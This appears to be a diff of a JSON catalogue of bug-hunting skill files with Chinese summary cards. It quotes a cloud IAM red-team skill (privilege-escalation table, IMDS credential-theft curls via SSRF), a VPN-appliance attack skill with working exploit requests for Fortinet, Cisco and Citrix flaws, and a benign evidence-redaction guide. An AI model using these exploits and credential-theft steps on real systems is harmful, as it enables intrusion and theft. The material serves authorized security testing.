+      "excerpt": "---\nname: cloud-iam-deep\ndescription: Cloud IAM red-team attack chain across AWS, Azure, GCP — focused on EXTERNAL exploitation paths and post-credential-discovery privilege analysis. Covers IAM enumeration (aws iam, az role, gcloud iam), STS/AssumeRole chaining, Azure Managed Identity abuse (via SSRF/leak), GCP service account JSON abuse, IMDSv1/v2 attacks via SSRF, K8s ServiceAccount token privilege analysis once held (token discovery / cluster exposure is owned by hunt-k8s), role-trust-policy confused-deputy, cross-account assume-role enumeration, IAM privilege escalation patterns (24+ AWS, 8+ Azure, 6+ GCP), and AWS Cognito Identity Pool unauthenticated-role attack chain (GetId → GetCredentialsForIdentity → IAM role abuse). Built for the case where recon yields a credential (key, JSON, token) and you need to know what it grants and how to escalate. Use when an AWS key / Azure secret / GCP service account JSON / K8s SA token surfaces from a code repo, JS bundle, APK, breach corpus, or SSRF chain.\nsources: aws-iam-docs, azure-rbac-docs, gcp-iam-docs, hackingthe.cloud, pacu, peirates, prowler, rhinosecuritylabs_research, hackerone_public\nreport_count: 6\n---\n\n## When to use\n\nTrigger when:\n- A cloud credential surfaces (key, secret, token, JSON file)\n- SSRF chain reaches IMDS / metadata endpoint\n- APK / git-leak reveals embedded cloud key\n- Recon shows public S3/GCS/Azure-blob with permissions you can verify\n- A Kubernetes API or service-account token is exposed\n- Post-RCE on a cloud-hosted instance — pivot to cloud control plane\n\nDo NOT use for:\n- On-prem-only environments (use AD attack skills — but those are out of scope per external-only boundary)\n- Web2 vulns that happen to be on AWS — use the relevant `hunt-*` skill\n\n---\n\n## Credential identification (first 60 seconds)\n\n```bash\n# AWS access key patterns\nAKIA[0-9A-Z]{16}                # IAM user access key (long-term)\nASIA[0-9A-Z]{16}                # STS temporary credential\nAGPA[0-9A-Z]{16}                # IAM group\nAIDA[0-9A-Z]{16}                # IAM user (user-id)\nAROA[0-9A-Z]{16}                # IAM role\nANPA[0-9A-Z]{16}                # Managed policy\n\n# AWS secret pattern (40-char base64-ish — context required)\n[A-Za-z0-9/+=]{40}              # AWS secret access key\n\n# Azure\nAccountKey=[A-Za-z0-9+/=]{86}   # Storage account key\nclient_secret pattern + UUID    # Azure AD app credential\n\n# GCP service account JSON\n{\n  \"type\": \"service_account\",\n  \"project_id\": \"...\",\n  \"private_key_id\": \"...\",\n  \"private_key\": \"-----BEGIN PRIVATE KEY-----...\"\n}\n\n# K8s SA token (JWT format — decode to confirm)\neyJhbGciOiJSUzI1...     # decode kid claim to see issuer\n```\n\n---\n\n## AWS — read-only validation (the safe first step)\n\n```bash\n# Set credential\nexport AWS_ACCESS_KEY_ID=\"AKIA...\"\nexport AWS_SECRET_ACCESS_KEY=\"...\"\n\n# 1. WHO am I?\naws sts get-caller-identity\n# Returns: UserId, Account, Arn\n# Arn tells you: IAM user vs role, account ID, name\n\n# 2. WHAT can I do? (the privesc question)\n# Try common read-only first — failures still inform you\naws iam list-users 2>&1 | head -5\naws iam list-roles 2>&1 | head -5\naws iam list-policies 2>&1 | head -5\naws iam list-groups 2>&1 | head -5\n\n# 3. WHAT policies are attached to me?\naws iam list-attached-user-policies --user-name <self>\naws iam list-user-policies --user-name <self>          # inline policies\naws iam list-groups-for-user --user-name <self>\n\n# 4. Service-by-service surface\naws ec2 describe-instances --max-items 1 2>&1 | head\naws s3 ls 2>&1 | head -10\naws lambda list-functions --max-items 5 2>&1 | head\naws rds describe-db-instances --max-items 5 2>&1 | head\naws secretsmanager list-secrets --max-results 5 2>&1 | head\naws ssm describe-parameters --max-results 5 2>&1 | head\n\n# 5. Audit any cross-account / external trust\naws iam list-roles --query 'Roles[?contains(AssumeRolePolicyDocument.Statement[0].Principal.AWS, `arn:aws:iam::`)]' 2>&1 | head -20\n```\n\n---\n\n## AWS privesc patterns (24+ documented — `iam_privesc` techniques)\n\nQuick lookup — if you have any of these IAM actions, escalate via the listed technique:\n\n| You have | Escalate via |\n|---|---|\n| `iam:CreateAccessKey` | Create access key on any user → impersonate |\n| `iam:CreateLoginProfile` | Set a console password on a user → login |\n| `iam:UpdateLoginProfile` | Reset console password on a user |\n| `iam:AttachUserPolicy` | Attach AdministratorAccess to self |\n| `iam:AttachGroupPolicy` | Attach AdministratorAccess to a group you're in |\n| `iam:AttachRolePolicy` + sts:AssumeRole | Attach to a role you can assume |\n| `iam:PutUserPolicy` | Inline AdministratorAccess to self |\n| `iam:PutGroupPolicy` | Inline policy on a group |\n| `iam:PutRolePolicy` | Inline on a role you can assume |\n| `iam:AddUserToGroup` | Add self to admin group |\n| `iam:UpdateAssumeRolePolicy` + sts:AssumeRole | Modify trust to allow self |\n| `iam:CreatePolicyVersion` | Create v2 of an attached policy with admin |\n| `iam:SetDefaultPolicyVersion` | Switch attached policy to admin version |\n| `iam:PassRole` + ec2:RunInstances | Launch EC2 as admin role → use instance creds |\n| `iam:PassRole` + lambda:CreateFunction/InvokeFunction | Run code as admin role |\n| `iam:PassRole` + cloudformation:CreateStack | CF stack creates resources as admin |\n| `iam:PassRole` + glue:CreateDevEndpoint | Notebook runs as admin role |\n| `iam:PassRole` + datapipeline | Pipeline runs as admin role |\n| `iam:PassRole` + codestar:CreateProject | New project gets admin role |\n| `ec2:RunInstances` (with admin instance profile already on the AMI) | Spin instance, exfil creds from IMDS |\n| `lambda:UpdateFunctionCode` (function has admin role) | Replace code → exfil creds |\n| `lambda:UpdateFunctionConfiguration` | Add layer / env var that exfils |\n| `cloudformation:UpdateStack` | Modify stack to grant self admin |\n| `sts:AssumeRole` (where trust allows you) | Direct privilege jump |\n\nMany of the destructive ones are out-of-scope for an external red-team; document the path, don't always execute.\n\n---\n\n## AWS — STS / cross-account / role chaining\n\n```bash\n# Enumerate roles you can assume across accounts\naws iam list-roles --query 'Roles[].[RoleName,AssumeRolePolicyDocument]' --output json > /tmp/roles.json\n# Parse for \"Principal.AWS\" containing different account IDs\n\n# Assume a role\naws sts assume-role --role-arn \"arn:aws:iam::OTHER_ACCT:role/CrossAccountRole\" --role-session-name \"rt-1\"\n\n# Set new creds\nexport AWS_ACCESS_KEY_ID=\"ASIA...\"\nexport AWS_SECRET_ACCESS_KEY=\"...\"\nexport AWS_SESSION_TOKEN=\"...\"\n\n# Verify\naws sts get-caller-identity  # should now show OTHER_ACCT\n\n# Re-enumerate from new identity (chain continues)\n```\n\n**Confused-deputy pattern:** look for `sts:ExternalId` missing or trust policies that allow `arn:aws:iam::*:role/*`. If `ExternalId` is not required, anyone can assume the role.\n\n---\n\n## AWS IMDSv1 / IMDSv2 abuse via SSRF\n\n```bash\n# IMDSv1 (legacy, still common — straight GET):\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/\n\n# Returns role name → fetch creds:\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>\n# JSON with AccessKeyId, SecretAccessKey, Token, Expiration\n\n# IMDSv2 (requires PUT to get a token first — usually mitigates SSRF):\ncurl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\"\nTOKEN=...\ncurl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/\n\n# SSRF bypass for IMDSv2:\n# Most server-side fetchers don't issue PUT requests → IMDSv2 blocks them.\n# Exception: SSRF in functions that themselves perform requests with custom headers.\n```\n\n---\n\n## Azure — credential validation\n\n```bash\n# Login with a credential\naz login --service-principal -u <appId> -p <password> --tenant <tenantId>\n# OR with managed identity (from inside Azure VM)\naz login --identity\n\n# Who am I?\naz account show\n\n# Subscriptions\naz account list --output table\n\n# Role assignments (Azure RBAC)\naz role assignment lis",
+      "card": {
+        "title_zh": "云IAM红队提权链",
+        "purpose_zh": "针对AWS、Azure、GCP的外部云IAM红队攻击链技能：当侦察获得云凭据（密钥、JSON、令牌）后，识别其类型、验证其权限范围，并分析可用的提权与横向路径。",
+        "does": [
+          "识别AWS、Azure、GCP及K8s凭据格式",
+          "用只读命令验证凭据身份与权限范围",
+          "枚举AWS跨账户角色信任与AssumeRole链",
+          "通过SSRF或后渗透利用IMDS与托管身份获取令牌",
+          "按平台列出IAM提权模式与对应技术",
+          "分析Cognito身份池未认证角色攻击链"
+        ],
+        "inputs": [
+          "AWS访问密钥或STS临时凭据",
+          "Azure服务主体凭据或托管身份",
+          "GCP服务账号JSON密钥文件",
+          "K8s服务账号JWT令牌",
+          "SSRF链或云主机上的RCE访问"
+        ],
+        "outputs": [
+          "凭据身份与所属账户信息",
+          "可访问资源与服务清单",
+          "提权路径与角色信任分析结果"
+        ],
+        "scenarios": [
+          "代码仓库或JS包泄露云密钥",
+          "APK或泄露数据中发现嵌入凭据",
+          "SSRF链触达云元数据端点",
+          "云主机RCE后转向控制平面",
+          "发现暴露的K8s API或服务账号令牌"
+        ],
+        "prerequisites": [
+          "已获得至少一个云凭据或元数据访问路径",
+          "具备aws、az、gcloud等CLI工具",
+          "目标为公有云环境而非纯本地环境"
+        ],
+        "limits": [
+          "不适用于纯本地环境",
+          "不覆盖恰好托管在AWS上的Web漏洞",
+          "破坏性提权技术仅建议记录路径而非总是执行",
+          "GCP角色查询仅限项目级不含组织级"
+        ],
+        "hosts": [
+          "未说明"
+        ],
+        "risk_flags": [
+          "shell",
+          "network",
+          "writes_files",
+          "needs_secret"
+        ],
+        "tags": [
+          "安全",
+          "调研",
+          "运维部署"
+        ],
+        "evidence": [
+          {
+            "field": "purpose_zh",
+            "quote": "Built for the case where recon yields a credential (key, JSON, token) and you need to know what it grants and how to escalate."
+          },
+          {
+            "field": "does",
+            "quote": "Credential identification (first 60 seconds)"
+          },
+          {
+            "field": "does",
+            "quote": "AWS — read-only validation (the safe first step)"
+          },
+          {
+            "field": "does",
+            "quote": "Enumerate roles you can assume across accounts"
+          },
+          {
+            "field": "does",
+            "quote": "AWS IMDSv1 / IMDSv2 abuse via SSRF"
+          },
+          {
+            "field": "does",
+            "quote": "AWS Cognito Identity Pool unauthenticated-role attack chain (GetId → GetCredentialsForIdentity → IAM role abuse)"
+          },
+          {
+            "field": "inputs",
+            "quote": "Use when an AWS key / Azure secret / GCP service account JSON / K8s SA token surfaces from a code repo, JS bundle, APK, breach corpus, or SSRF chain."
+          },
+          {
+            "field": "outputs",
+            "quote": "# Returns: UserId, Account, Arn"
+          },
+          {
+            "field": "scenarios",
+            "quote": "A cloud credential surfaces (key, secret, token, JSON file)"
+          },
+          {
+            "field": "scenarios",
+            "quote": "SSRF chain reaches IMDS / metadata endpoint"
+          },
+          {
+            "field": "scenarios",
+            "quote": "APK / git-leak reveals embedded cloud key"
+          },
+          {
+            "field": "scenarios",
+            "quote": "A Kubernetes API or service-account token is exposed"
+          },
+          {
+            "field": "prerequisites",
+            "quote": "On-prem-only environments (use AD attack skills — but those are out of scope per external-only boundary)"
+          },
+          {
+            "field": "limits",
+            "quote": "Web2 vulns that happen to be on AWS — use the relevant `hunt-*` skill"
+          },
+          {
+            "field": "limits",
+            "quote": "Many of the destructive ones are out-of-scope for an external red-team; document the path, don't always execute."
+          },
+          {
+            "field": "risk_flags",
+            "quote": "aws iam list-roles --query 'Roles[].[RoleName,AssumeRolePolicyDocument]' --output json > /tmp/roles.json"
+          }
+        ]
+      }
+    },
+    {
+      "skill_path": "skills/enterprise-vpn-attack/SKILL.md",
+      "blob_sha": "b860662355d3afc5169284e2ca2c8fc4f01896f4",
+      "source_url": "https://github.com/elementalsouls/Claude-BugHunter/blob/64410edb7f445e1837665e2fd713d47958a51094/skills/enterprise-vpn-attack/SKILL.md",
+      "fetched_at": "2026-11-17T00:18:16.822Z",
+      "generated_at": null,
+      "model": null,
+      "status": "failed",
+      "last_error": "Skill card failed schema or evidence validation",
+      "card_prompt_version": "skill_card_v1",
+      "frontmatter": {
+        "name": "enterprise-vpn-attack",
+        "description": "External SSL VPN / remote-access appliance attack matrix — Cisco ASA/AnyConnect, Fortinet FortiGate/FortiOS, Citrix NetScaler/ADC, Palo Alto GlobalProtect, Pulse Secure / Ivanti Connect Secure, SonicWall, F5 Big-IP. Covers version fingerprinting, CVE matrix (2018-2026), AAA backend identification, default credentials, configuration-disclosure paths, pre-auth RCE/SSRF/path-traversal exploits where applicable. Built from authorized-engagement Cisco ASA testing plus 2024-2026 enterprise VPN CVE lan"
+      },
+      "excerpt": "---\nname: enterprise-vpn-attack\ndescription: External SSL VPN / remote-access appliance attack matrix — Cisco ASA/AnyConnect, Fortinet FortiGate/FortiOS, Citrix NetScaler/ADC, Palo Alto GlobalProtect, Pulse Secure / Ivanti Connect Secure, SonicWall, F5 Big-IP. Covers version fingerprinting, CVE matrix (2018-2026), AAA backend identification, default credentials, configuration-disclosure paths, pre-auth RCE/SSRF/path-traversal exploits where applicable. Built from authorized-engagement Cisco ASA testing plus 2024-2026 enterprise VPN CVE landscape. Use whenever the target's perimeter exposes any SSL VPN appliance or remote-access gateway — these are the most common initial-access points in 2024-2026 actor TTPs.\nsources: authorized-engagement, public-advisories, cisa-kev\nreport_count: 1\n---\n\n## When to use this skill\n\nTrigger when recon surfaces:\n- `*.<client>.example/+CSCOE+/logon.html` or similar `+CSCOE+` paths → Cisco ASA / AnyConnect\n- `intranet.*` / `vpn.*` / `connect.*` / `webvpn.*` / `wc.*` / `remote.*` subdomains\n- Port 443 returning login pages with `Server: Apache` or banner like \"AnyConnect\", \"FortiGate\", \"NetScaler\", \"GlobalProtect\", \"Pulse\", \"Ivanti\"\n- TCP 8443 / 4443 / 10443 / 8888 (common VPN web-mgmt ports)\n- HTTP responses with `Set-Cookie: webvpn=` (Cisco) / `SVPNCOOKIE=` (Fortinet) / `NSC_AAA=` (Citrix) / `DSAuthSession=` (Pulse) / `BIGipServer*` (F5)\n\nDO NOT use for:\n- Internal lateral-movement post-foothold (out of scope per user's boundary)\n- VPN client-side bugs (different attack class)\n- IPsec / L2TP / OpenVPN (different protocols, not SSL VPN web stack)\n\n---\n\n## Vendor identification (fingerprinting)\n\n### Cisco ASA / AnyConnect\n```bash\ncurl -skI 'https://target/+CSCOE+/logon.html' | head -10\n# Look for: Set-Cookie: webvpn=; X-Frame-Options: SAMEORIGIN; CSP: ... block-all-mixed-content\n# Login page contains: \"AnyConnect\", \"CSCOE\", \"logon.html\"\n```\nASA version: not banner-disclosed in modern builds; need to derive from JS file paths or test specific paths.\n\n```bash\n# Path-based version hints (older builds leaked builds in URLs)\ncurl -sk 'https://target/+CSCOE+/sdesktop/scan-finalize?path=test'\ncurl -sk 'https://target/+CSCOE+/saml/sp/metadata'         # 200 = SAML auth enabled\ncurl -sk 'https://target/CSCOSSLC/config-auth'             # AnyConnect handshake endpoint\n```\n\n### Fortinet FortiGate / FortiOS\n```bash\ncurl -skI 'https://target/remote/login' | head -10\n# Look for: Set-Cookie: SVPNCOOKIE=, Server header missing or \"xxxxxxxx-xxxxx\"\n# Login page contains: \"FortiGate\", \"Fortinet\", \"SSL-VPN\"\n```\nVersion: `/remote/info` sometimes leaks (older), or `/login?username=` 302 response\n\n### Citrix NetScaler / ADC / Gateway\n```bash\ncurl -skI 'https://target/' | head -10\n# Look for: Set-Cookie: NSC_AAA=, Set-Cookie: NSC_USER=, Server: NetScaler\n# Login page contains: \"NetScaler\", \"Citrix Gateway\"\n\n# Version banner\ncurl -sk 'https://target/vpn/index.html' | grep -oE 'NetScaler/[0-9.]+|NS[0-9.]+'\ncurl -sk 'https://target/menu/neo'                # 200 if vulnerable to CVE-2019-19781 era\n```\n\n### Palo Alto GlobalProtect\n```bash\ncurl -skI 'https://target/global-protect/login.esp' | head -10\n# Look for: Set-Cookie: PHPSESSID= (yes, GP uses PHP), Server: Apache (PA-VM internal)\n# Page contains: \"GlobalProtect Portal\", \"PAN-OS\"\n\n# Version banner via login page\ncurl -sk 'https://target/global-protect/login.esp' | grep -oE 'GlobalProtect Portal[\\s\\S]{0,200}'\n# Or check meta tag\ncurl -sk 'https://target/global-protect/login.esp' | grep -oE 'panui-[0-9.]+'\n```\n\n### Pulse Secure / Ivanti Connect Secure\n```bash\ncurl -skI 'https://target/dana-na/auth/url_default/welcome.cgi' | head -10\n# Look for: Set-Cookie: DSAuthSession=, DSPREAUTH=\n# Page contains: \"Pulse Secure\" or \"Ivanti Connect Secure\"\n\n# Version\ncurl -sk 'https://target/dana-na/auth/url_default/welcome.cgi' | grep -oE 'Pulse Connect Secure[^<]*|ivanti[^<]*[0-9.]+'\n```\n\n### SonicWall NetExtender / SMA\n```bash\ncurl -skI 'https://target/cgi-bin/welcome' | head -10\n# Look for: Set-Cookie: swap=, swapauth=\n# Page contains: \"SonicWall\", \"NetExtender\", \"SMA\"\n```\n\n### F5 Big-IP / APM\n```bash\ncurl -skI 'https://target/my.policy' | head -10\n# Look for: Set-Cookie: BIGipServer*, MRHSession=\n# Server: BIG-IP (sometimes)\n```\n\n---\n\n## CVE matrix — pre-auth or auth-bypass (2018-2026)\n\n### Cisco ASA / AnyConnect\n\n| CVE | Affects | Type | Test |\n|---|---|---|---|\n| **CVE-2018-0296** | ASA pre-9.x specific builds | Path traversal — info disclosure (sessions, config) | `GET /+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua` |\n| **CVE-2020-3452** | ASA, FTD before specific patch levels | Path traversal — file read | `GET /+CSCOE+/files/file_name.html?Filename=Microsoft.Manifest+/+CSCOT+/lua/test.lua` and variations |\n| **CVE-2023-20269** | ASA, FTD specific | Auth bypass on SSL VPN | Brute-force a group + valid creds combo against `/+webvpn+/index.html` |\n| **CVE-2024-20481** | RAVPN | DoS via crafted handshake | **SKIP in red team — disruptive** |\n\n```bash\n# Cisco CVE-2020-3452 — file read\ncurl -sk 'https://target/+CSCOE+/files/file_name.html?Filename=Microsoft.Manifest+/+CSCOT+/lua/test.lua' | head -5\n\n# Cisco CVE-2018-0296 — path traversal\ncurl -sk 'https://target/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua' | head -20\n\n# Files commonly retrievable on vulnerable ASA:\n# /+CSCOE+/portal_inc.lua    (portal inclusions — may reveal local users)\n# /+CSCOE+/session_password.html\n# /+CSCOE+/files/files.html\n```\n\n### Fortinet FortiGate / FortiOS\n\n| CVE | Affects | Type | Test |\n|---|---|---|---|\n| **CVE-2018-13379** | FortiOS 5.4-6.0 | Path traversal — sslvpn_websession file read | `GET /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession` |\n| **CVE-2022-42475** | FortiOS 7.x specific | Heap overflow — pre-auth RCE | Complex exploit; test with `nuclei` template `CVE-2022-42475` |\n| **CVE-2023-27997** (XORtigate) | FortiOS various | Heap overflow — pre-auth RCE | Public PoCs exist; nuclei template available |\n| **CVE-2024-21762** | FortiOS 6.x-7.x | OOB write — pre-auth RCE | Public PoC; nuclei template `CVE-2024-21762` |\n| **CVE-2024-55591** | FortiOS 7.0-7.4 | Auth bypass on FortiOS Node.js websocket admin interface | `GET /endpoint` on admin-interface port |\n\n```bash\n# Fortinet CVE-2018-13379 — most reliably-fingerprintable file read\ncurl -sk --path-as-is 'https://target/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession'\n# Response contains plaintext usernames + sessions if vulnerable\n\n# Fortinet credential dump format (from CVE-2018-13379 dumps that hit pastebin in 2021):\n# IP:PORT     username     password     (and others)\n```\n\n### Citrix NetScaler / ADC / Gateway\n\n| CVE | Affects | Type | Test |\n|---|---|---|---|\n| **CVE-2019-19781** (Shitrix) | ADC/Gateway 10.5-13.0 specific | Path traversal → RCE via XML upload | `GET /vpn/../vpns/cfg/smb.conf` |\n| **CVE-2022-27518** | ADC/Gateway with SAML configured | Pre-auth RCE | Complex; test with nuclei |\n| **CVE-2023-3519** | NetScaler ADC/Gateway 13.0-13.1 specific | Pre-auth RCE via crafted HTTP | Public PoCs exist |\n| **CVE-2023-4966** (Citrix Bleed) | NetScaler ADC/Gateway 13.0-14.1 | Memory disclosure → session token theft | `POST /oauth/idp/.well-known/openid-configuration` with crafted Host header — long Host header triggers memory leak in response |\n\n```bash\n# Citrix Bleed (CVE-2023-4966) detection\nHOST=$(python3 -c \"print('A' * 24812)\")\ncurl -sk -X POST -H \"Host: $HOST\" \"https://target/oauth/idp/.well-known/openid-configuration\" -o response.txt\n# If response is large (>10KB) and contains random memory contents — vulnerable\n# Session tokens often present in the memory dump\n\n# CVE-2019-19781 file read\ncurl -sk --path-as-is 'https://target/vpn/../vpns/cfg/smb.conf'\n```\n\n### Palo Alto GlobalProtect\n\n| CVE | Affects | Type | Test |\n|---|---|---|---|\n| **CVE-2024-3400** | PAN-OS 10.2-11.1 with GP enabled | Command injection — pre-auth RCE | `POST /ssl-vpn/login.esp` with ",
+      "card": null
+    },
+    {
+      "skill_path": "skills/evidence-hygiene/SKILL.md",
+      "blob_sha": "159952c88f49996053f7833f86280f00a65007dd",
+      "source_url": "https://github.com/elementalsouls/Claude-BugHunter/blob/64410edb7f445e1837665e2fd713d47958a51094/skills/evidence-hygiene/SKILL.md",
+      "fetched_at": "2026-11-17T00:18:16.822Z",
+      "generated_at": "2026-11-17T00:18:16.822Z",
+      "model": "deepseek-flash",
+      "status": "ok",
+      "last_error": null,
+      "card_prompt_version": "skill_card_v1",
+      "frontmatter": {
+        "name": "evidence-hygiene",
+        "description": "Evidence-capture and PoC-redaction discipline for bug-bounty submissions: cookie redaction protocol (which fields to mask, Preview annotation / Burp panel hiding / DevTools workflow), PII black-bar discipline (what to mask in other-user data — names, emails, phones, faces — vs what is safe to leave — usernames, trace IDs, request bodies), HAR file sanitization (jq filters for Cookie/Set-Cookie/Authorization headers), Burp Repeater/Intruder screenshot hygiene (hide request body, show only Results"
+      },
+      "excerpt": "---\nname: evidence-hygiene\ndescription: \"Evidence-capture and PoC-redaction discipline for bug-bounty submissions: cookie redaction protocol (which fields to mask, Preview annotation / Burp panel hiding / DevTools workflow), PII black-bar discipline (what to mask in other-user data — names, emails, phones, faces — vs what is safe to leave — usernames, trace IDs, request bodies), HAR file sanitization (jq filters for Cookie/Set-Cookie/Authorization headers), Burp Repeater/Intruder screenshot hygiene (hide request body, show only Results table for rate-limit attacks), Chrome DevTools Console PoC patterns (credentials include so cookies are not echoed, labeled console.log), screenshot capture order, filename conventions, post-submission rotation hygiene. Use BEFORE any PoC screenshot, BEFORE attaching a HAR, or whenever preparing evidence with session cookies or other-user PII. Pairs with bugcrowd-reporting and report-writing.\"\nsources: community, operator_experience\n---\n\n# EVIDENCE HYGIENE — PoC Capture & Redaction Discipline\n\n> Use this skill BEFORE capturing any screenshot, exporting any HAR, or attaching any evidence to a bug-bounty submission. It catches the most common evidence-hygiene mistakes that cause cookies to leak, PII to be shared without consent, or screenshots to be unsuitable for triage.\n\nThe core principle: **Bug-bounty evidence is meant to convince a triager. Anything beyond that — live cookies, real-user PII, internal trace IDs that aren't useful — should not be in the evidence.**\n\n---\n\n## 1. Two Categories of Sensitive Data\n\nEvery PoC artifact (screenshot, HAR, raw HTTP request, terminal transcript) potentially contains data that needs different treatment.\n\n| Category | Examples | Treatment |\n|---|---|---|\n| **Your-account secrets** | Session cookies, OAuth tokens, refresh tokens, API keys | Always redact. Even in private bug-bounty platform attachments. Your account, your session — protect it. |\n| **Other users' PII** | Real names, emails, phone numbers, addresses, profile photos, account IDs | Redact unless explicitly demonstrating cross-account impact. Even then, mask faces and minimize the data you display. |\n| **Triager-useful metadata** | Trace IDs (`x-datadog-trace-id`), request IDs, server timestamps, your test account UID/email, GraphQL operation names, response shapes | **Leave visible** — these help the triager correlate to logs and reproduce. |\n| **Test-account passwords (limited use)** | Throwaway passwords on a test account (e.g., `Testing@5678`) | Acceptable in screenshots if you rotate immediately after submission so the value shown is dead. Don't leave real-use passwords in evidence. |\n\n---\n\n## 2. Cookie Redaction Protocol\n\n### 2.1 What must be masked\n\nThe session cookie value is the highest-value secret in any PoC. Mask:\n\n- The session cookie (`authn`, `session`, `sid`, `__Secure-id`, etc. — name varies per target)\n- `csrf-token` if it's bound to your session\n- `Authorization` headers (Bearer tokens, JWT)\n- `Cookie` request header values for any session-bearing cookie\n- `Set-Cookie` response header values for any session-bearing cookie\n\n### 2.2 What's safe to leave visible\n\n- Cloudflare cookies (`__cf_bm`, `_cfuvid`) — these are bot-management, not session-bearing\n- Analytics cookies (`ajs_anonymous_id`, `_ga`)\n- Trace correlation IDs (`x-datadog-trace-id`, `x-request-id`)\n- Server / framework headers (`Server: cloudflare`, `X-Frame-Options`)\n- Your test account email/UID (per Bugcrowdninja alias section in `bugcrowd-reporting`)\n\n### 2.3 Redaction methods (ranked by practicality)\n\n**Method A — Don't capture the cookies in the first place** (preferred when possible)\n- For DevTools Console PoCs: use `credentials: 'include'` so the browser sends cookies automatically. Console output won't echo the cookie. Screenshot the Console output, never the Network tab Headers panel.\n- For Burp Repeater PoCs: drag the bottom request/response panel divider DOWN to hide the request body before screenshotting. Capture only the Results table for Intruder runs.\n\n**Method B — Black-bar in image editor** (when capture inevitably includes cookies)\n- macOS: Open screenshot in Preview → Tools → Annotate → Rectangle → set fill color to black → drag rectangle over the cookie value → save\n- Windows: Use Snip & Sketch's annotation tools or any image editor (Paint.NET, etc.)\n- Burp itself: in Burp's Proxy → Match and Replace, you can pre-emptively redact cookie values to placeholder strings before screenshotting\n\n**Method C — Find/replace in raw text** (for HAR files, terminal transcripts)\n- See §4 for the jq commands\n\n### 2.4 Pre-screenshot checklist\n\nBefore clicking Capture:\n\n```\n[ ] Network tab Headers panel is collapsed or out of frame\n[ ] Burp's Request panel is hidden behind the divider drag\n[ ] No \"Copy as cURL\" output is visible on screen\n[ ] DevTools Application → Storage → Cookies tab is closed\n[ ] Browser URL bar doesn't show a session token in query string (rare but possible)\n```\n\nAfter capturing:\n\n```\n[ ] Open the screenshot at full resolution before saving\n[ ] Search for the session cookie name substring in any visible text — if present, redact\n[ ] Search for the literal first 6 chars of your cookie value — if present, redact\n[ ] Compare to the previous PoC screenshot in the same engagement — same redaction discipline\n```\n\n---\n\n## 3. PII Black-Bar Protocol\n\nWhen a PoC necessarily exposes another user's data (e.g., demonstrating IDOR by showing the victim's email in an attacker-session response), redact the actual PII even in private attachments.\n\n### 3.1 What to mask (other-user data)\n\n- First name, last name (full or partial)\n- Email address (mask the local part; can leave domain if non-identifying)\n- Phone number (mask the last 7 digits, optionally leave country code)\n- Physical address (mask everything below city)\n- Date of birth (mask the year, optionally the month)\n- Government IDs (SSN, passport — mask everything)\n- Profile photos / face images (black-bar the face entirely)\n- Account IDs that the user could correlate to public profiles\n\n### 3.2 What to leave visible (proves the bug, not the user)\n\n- The fact that the field was returned (the JSON key name)\n- The shape / type of the field (`\"first_name\": \"<REDACTED>\"`)\n- Your own (attacker session's) UID / email — this proves cross-account\n- The endpoint URL and request method\n- The trace ID\n\n### 3.3 Worked example — IDOR PoC body\n\n**Bad (leaks victim's full PII):**\n```json\n{\"data\":{\"contact\":{\"first_name\":\"Nadene\",\"last_name\":\"Afton\",\"email\":\"nadene.afton@example.com\",\"phone\":\"+1-555-867-5309\"}}}\n```\n\n**Good (proves the bug, masks the PII):**\n```json\n{\"data\":{\"contact\":{\"first_name\":\"<REDACTED — real first name>\",\"last_name\":\"<REDACTED — real last name>\",\"email\":\"<REDACTED>@example.com\",\"phone\":\"<REDACTED>\"}}}\n```\n\nIn screenshot form, black-bar each value with a rectangle annotation labeled \"REAL PII REDACTED\" if there's space.\n\n### 3.4 In the report body\n\nReference the redaction explicitly:\n\n```markdown\n## Proof of Concept\n\nThe screenshot below demonstrates the IDOR. The attacker session (uid 12345678) successfully retrieves the victim's profile data (uid 99887766). **Real PII fields in the response are masked with black rectangles to limit unauthorized exposure of victim data, per responsible-disclosure hygiene.** The unredacted response is available privately on request.\n```\n\nThis signals the triager that you're disciplined and gives them a clear path to the unredacted version if they need it for verification.\n\n---\n\n## 4. HAR File Sanitization\n\nHAR (HTTP Archive) files are JSON dumps of network traffic with full request/response bodies and headers. They include cookies, auth tokens, and any PII that was in transit.\n\n### 4.1 Generate the HAR\n\nChrome DevTools → Network tab → right-click anywhere in the request list → \"Save all as HAR with content\"\n\n### 4.2 Sanitize before attaching\n\nUse `jq` to strip sensitive headers. Save this as a shell function or one-liner you can re-",
+      "card": {
+        "title_zh": "漏洞赏金证据脱敏规范",
+        "purpose_zh": "在截取PoC截图、导出HAR或附加证据前，规范会话Cookie、他人PII与敏感请求头的遮蔽流程，避免泄露并提升triager可读性。",
+        "does": [
+          "区分需遮蔽的账户密钥、他人PII与可保留的追踪元数据",
+          "给出Cookie与Authorization头的遮蔽方法与截图前检查清单",
+          "提供IDOR场景下PII黑条遮蔽示例与报告措辞",
+          "用jq过滤脚本清理HAR中的Cookie、Set-Cookie、Authorization",
+          "规范Burp Repeater/Intruder截图只保留必要面板",
+          "给出DevTools Console干净PoC写法与分步截图顺序"
+        ],
+        "inputs": [
+          "PoC截图",
+          "HAR文件",
+          "原始HTTP请求",
+          "终端记录"
+        ],
+        "outputs": [
+          "脱敏后的截图",
+          "已清理的sanitized HAR文件",
+          "含脱敏说明的报告文本"
+        ],
+        "scenarios": [
+          "提交漏洞赏金PoC前",
+          "附加HAR文件前",
+          "演示IDOR等跨账户影响时",
+          "截取限速/爆破Intruder结果时"
+        ],
+        "prerequisites": [
+          "具备jq命令行工具用于HAR过滤",
+          "可用的图像编辑工具做黑条标注",
+          "Chrome DevTools或Burp Suite环境"
+        ],
+        "limits": [
+          "仅覆盖证据采集与脱敏流程，不含漏洞发现或报告结构",
+          "jq过滤需按目标字段名自行调整",
+          "未说明自动化校验脱敏完整性的机制"
+        ],
+        "hosts": [
+          "未说明"
+        ],
+        "risk_flags": [
+          "shell",
+          "writes_files"
+        ],
+        "tags": [
+          "安全",
+          "文档",
+          "其他"
+        ],
+        "evidence": [
+          {
+            "field": "purpose_zh",
